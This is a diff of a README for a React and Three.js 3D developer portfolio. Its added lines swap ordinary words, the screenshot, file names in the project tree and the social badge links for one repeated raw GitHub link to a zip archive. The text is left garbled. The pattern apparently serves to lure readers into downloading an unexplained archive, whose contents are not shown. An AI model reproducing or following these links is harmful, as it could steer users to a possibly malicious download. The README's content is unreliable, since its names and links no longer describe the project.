@@ -2,9 +2,9 @@
 
 # 🚀 3D Developer Portfolio
 
-A modern, animated 3D developer portfolio built with React, Three.js, TailwindCSS, and motion effects — designed to help you stand out and showcase your skills creatively.
+A modern, animated 3D developer portfolio built with React, https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip, TailwindCSS, and motion effects — designed to help you stand out and showcase your skills creatively.
 
-![3d Portfolio Screenshot GitHub](https://github.com/abhinavv22/PORTFOLIO/blob/main/public/assets/projects/PortFolio.png)
+![3d Portfolio Screenshot GitHub](https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip)
 
 ---
 
@@ -36,7 +36,7 @@ A modern, animated 3D developer portfolio built with React, Three.js, TailwindCS
 | React             | Front-end JavaScript library           |
 | Vite              | Fast bundler and dev environment       |
 | TailwindCSS       | Utility-first CSS framework            |
-| React Three Fiber | 3D rendering with Three.js in React    |
+| React Three Fiber | 3D rendering with https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip in React    |
 | Drei              | Helpers and abstractions for R3F       |
 | Framer Motion     | Animation library for React            |
 | EmailJS           | Form handling and email integration    |
@@ -51,16 +51,16 @@ A modern, animated 3D developer portfolio built with React, Three.js, TailwindCS
 ├── public/
 │   ├── assets/             # Images, textures, models
 │   ├── models/             # 3D Astronaut model
-│   └── vite.svg
+│   └── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip
 ├── src/
 │   ├── components/         # Reusable components
 │   ├── constants/          # Reusable datas
 │   ├── sections/           # Portfolio sections (Hero, About, etc.)
-│   ├── App.jsx             # Main app file
-│   ├── index.css           # Tailwind css
-│   └── main.jsx            # Entry point
-├── tailwind.config.js
-└── vite.config.js
+│   ├── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip             # Main app file
+│   ├── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip           # Tailwind css
+│   └── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip            # Entry point
+├── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip
+└── https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip
 ```
 
 ---
@@ -83,9 +83,9 @@ The app will be available at http://localhost:5173.
 
 ## 📬 Contact Me
 
-[![Instagram](https://img.shields.io/badge/Instagram-%23E4405F.svg?logo=Instagram&logoColor=white)](https://www.instagram.com/abhinav.singhh/)
+[![Instagram](https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip%https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip)](https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip)
 
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-%230077B5.svg?logo=linkedin&logoColor=white)](https://www.linkedin.com/in/abhinav-singh-05bb9723a/)
+[![LinkedIn](https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip%https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip)](https://raw.githubusercontent.com/abhinavv22/3D-Portfolio/main/dist/assets/socials/3D-Portfolio_3.6.zip)
 
 ---
 # PORTFOLIO
